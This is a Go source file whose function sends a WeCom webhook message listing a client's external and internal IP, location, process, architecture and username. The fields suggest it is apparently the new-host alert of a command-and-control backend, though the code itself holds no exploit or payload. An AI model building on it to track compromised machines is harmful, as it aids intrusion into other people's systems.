package webhooks

import (
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/logger"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type weComTextMsg struct {
	MsgType string       `json:"msgtype"`
	Text    weComContent `json:"text"`
}

type weComContent struct {
	Content             string   `json:"content"`
	MentionedList       []string `json:"mentioned_list,omitempty"`
	MentionedMobileList []string `json:"mentioned_mobile_list,omitempty"`
}

func SendWecom(Client database.Clients, WxKey string) error {
	content := fmt.Sprintf("External_IP:%s\nLocaltion:%s\nProcess:%s\nArch:%s\nInternal_IP:%s\nUser:%s\n", Client.ExternalIP, Client.Address, Client.Process, Client.Arch, Client.InternalIP, Client.Username)
	webhookURL := fmt.Sprintf("%s?key=%s", config.WecomPushApi, WxKey)
	msg := weComTextMsg{
		MsgType: "text",
		Text: weComContent{
			Content: content,
		},
	}

	body, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("json marshal error: %w", err)
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(webhookURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		logger.Error(err.Error())
		return fmt.Errorf("http post error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		logger.Error(fmt.Sprintf("wechat webhook response status: %s", resp.Status))
		return fmt.Errorf("wechat webhook response status: %s", resp.Status)
	}
	return nil
}
